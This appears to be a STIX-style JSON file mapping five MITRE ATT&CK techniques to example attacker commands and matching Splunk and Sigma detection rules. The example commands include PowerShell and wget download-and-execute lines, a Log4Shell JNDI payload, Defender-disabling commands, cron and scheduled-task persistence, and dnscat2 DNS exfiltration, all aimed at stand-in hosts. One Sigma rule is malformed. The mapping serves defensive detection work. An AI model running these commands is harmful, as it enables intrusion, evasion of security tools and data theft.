{
    "objects": [
      {
        "type": "attack-pattern",
        "id": "attack-pattern--1059",
        "name": "Command and Scripting Interpreter",
        "external_references": [
          {
            "source_name": "mitre-attack",
            "url": "https://attack.mitre.org/techniques/T1059/",
            "external_id": "T1059"
          }
        ],
        "x_mitre_attack": {
          "tactics": ["execution"],
          "platforms": ["windows", "linux", "macos"],
          "data_sources": ["process", "command"],
          "defense_bypassed": ["Anti-virus"],
          "impact_type": ["privilege-escalation", "execution"],
          "mitigations": ["Application Control", "Restrict File and Directory Permissions"],
          "example_procedure": [
            {
              "description": "Adversaries may abuse PowerShell commands to execute arbitrary code.",
              "command": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\""
            },
            {
              "description": "Adversaries may use Bash to execute scripts.",
              "command": "bash -c 'wget http://malicious.com/payload.sh | sh'"
            }
          ],
          "detection": {
            "data_components": ["CommandLine", "ProcessName", "ParentProcessName"],
            "example_query": {
              "splunk": "index=* sourcetype=sysmon EventCode=1 CommandLine=\"*powershell*\" OR CommandLine=\"*cmd.exe*\" | stats count by Computer, User, CommandLine",
              "sigma": {
                "title": "Detect Command Execution via PowerShell or Cmd",
                "logsource": {
                  "category": "process_creation",
                  "product": "windows"
                },
                "detection": {
                  "selection": {
                    "CommandLine|contains": ["powershell", "cmd.exe"]
                  },
                  "condition": "selection"
                }
              }
            }
          }
        }
      },
      {
        "type": "attack-pattern",
        "id": "attack-pattern--1562-002",
        "name": "Disable Security Tools",
        "external_references": [
          {
            "source_name": "mitre-attack",
            "url": "https://attack.mitre.org/techniques/T1562/002/",
            "external_id": "T1562.002"
          }
        ],
        "x_mitre_attack": {
          "tactics": ["defense-evasion"],
          "platforms": ["windows"],
          "data_sources": ["process", "registry", "service"],
          "defense_bypassed": ["Host Intrusion Prevention System", "Anti-virus"],
          "impact_type": ["defense-evasion"],
          "mitigations": ["Restrict Registry Permissions", "Behavioral Prevention on Endpoint"],
          "example_procedure": [
            {
              "description": "Adversaries may disable Windows Defender using PowerShell.",
              "command": "Set-MpPreference -DisableRealtimeMonitoring $true"
            },
            {
              "description": "Adversaries may stop security services.",
              "command": "net stop WinDefend"
            }
          ],
          "detection": {
            "data_components": ["CommandLine", "ServiceName", "RegistryKey"],
            "example_query": {
              "splunk": "index=* sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 CommandLine=\"*DisableRealtimeMonitoring*\" OR CommandLine=\"*net stop WinDefend*\"",
              "sigma": {
                "title": "Detect Windows Defender Disabling",
                "logsource": {
                  "category": "process_creation",
                  "product": "windows"
                },
                "detection": {
                  "selection": {
                    "CommandLine|contains": ["DisableRealtimeMonitoring", "net stop WinDefend"]
                  },
                  "condition": "selection"
                }
              }
            }
          }
        }
      },
      {
        "type": "attack-pattern",
        "id": "attack-pattern--1190",
        "name": "Exploit Public-Facing Application",
        "external_references": [
          {
            "source_name": "mitre-attack",
            "url": "https://attack.mitre.org/techniques/T1190/",
            "external_id": "T1190"
          }
        ],
        "x_mitre_attack": {
          "tactics": ["initial-access"],
          "platforms": ["windows", "linux"],
          "data_sources": ["application", "network"],
          "defense_bypassed": ["Firewall", "Intrusion Detection System"],
          "impact_type": ["initial-access"],
          "mitigations": ["Patch Management", "Network Segmentation"],
          "example_procedure": [
            {
              "description": "Exploit CVE-2021-44228 (Log4Shell) on a vulnerable Apache server.",
              "cve": ["CVE-2021-44228"],
              "command": "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' http://vulnerable-server:8080"
            }
          ],
          "detection": {
            "data_components": ["HttpRequest", "UserAgent", "Payload"],
            "example_query": {
              "splunk": "index=* sourcetype=access_* \"${jndi:\" | stats count by src_ip, http_user_agent",
              "sigma": {
                "title": "Detect Log4Shell Exploitation Attempt",
                "logsource": {
                  "category": "web",
                  "product": "apache"
                },
                "detection": {
                  "selection": {
                    "http_user_agent|contains": "${jndi:"
                  },
                  "condition": "selection"
                }
              }
            }
          }
        }
      },
      {
        "type": "attack-pattern",
        "id": "attack-pattern--1053",
        "name": "Scheduled Task/Job",
        "external_references": [
          {
            "source_name": "mitre-attack",
            "url": "https://attack.mitre.org/techniques/T1053/",
            "external_id": "T1053"
          }
        ],
        "x_mitre_attack": {
          "tactics": ["persistence", "privilege-escalation"],
          "platforms": ["windows", "linux"],
          "data_sources": ["process", "cron", "scheduled_task"],
          "defense_bypassed": ["Host Intrusion Prevention System"],
          "impact_type": ["persistence"],
          "mitigations": ["Restrict File and Directory Permissions", "Configure Execution Prevention"],
          "example_procedure": [
            {
              "description": "Create a scheduled task to execute a malware payload.",
              "command": "schtasks /create /tn \"WindowsUpdateCheck\" /tr \"C:\\malware.exe\" /sc hourly"
            },
            {
              "description": "Add a cron job on Linux to maintain persistence.",
              "command": "(crontab -l 2>/dev/null; echo \"0 * * * * /tmp/malware.sh\") | crontab -"
            }
          ],
          "detection": {
            "data_components": ["TaskName", "Command", "Author"],
            "example_query": {
              "splunk": "index=* sourcetype=WinEventLog:Microsoft-Windows-TaskScheduler/Operational EventCode=106 TaskName=\"*WindowsUpdate*\" OR TaskName=\"*malware*\"",
              "sigma": {
                "title": "Detect Suspicious Scheduled Tasks",
                "logsource": {
                  "category": "process_creation",
                  "product": "windows"
                },
                "detection": {
                  "selection": {
                    "TaskName|wildcard": "*WindowsUpdate*", "*malware*"
                  },
                  "condition": "selection"
                }
              }
            }
          }
        }
      },
      {
        "type": "attack-pattern",
        "id": "attack-pattern--1048",
        "name": "Exfiltration Over Alternative Protocol",
        "external_references": [
          {
            "source_name": "mitre-attack",
            "url": "https://attack.mitre.org/techniques/T1048/",
            "external_id": "T1048"
          }
        ],
        "x_mitre_attack": {
          "tactics": ["exfiltration"],
          "platforms": ["windows", "linux"],
          "data_sources": ["network", "process"],
          "defense_bypassed": ["Network Intrusion Detection System"],
          "impact_type": ["exfiltration"],
          "mitigations": ["Network Segmentation", "Restrict File and Directory Permissions"],
          "example_procedure": [
            {
              "description": "Use DNS tunneling to exfiltrate data.",
              "command": "dnscat2 --dns server=attacker.com --no-cache",
              "network_signature": {
                "protocol": "DNS",
                "pattern": "Base64 encoded data in DNS queries"
              }
            }
          ],
          "detection": {
            "data_components": ["DnsQuery", "ProcessName", "DestinationIP"],
            "example_query": {
              "splunk": "index=* sourcetype=dns Query=\"*.attacker.com\" | stats count by src_ip, Query",
              "sigma": {
                "title": "Detect DNS Tunneling Activity",
                "logsource": {
                  "category": "network_connection",
                  "product": "windows"
                },
                "detection": {
                  "selection": {
                    "DestinationHostname|endswith": ".attacker.com"
                  },
                  "condition": "selection"
                }
              }
            }
          }
        }
      }
    ]
  }
  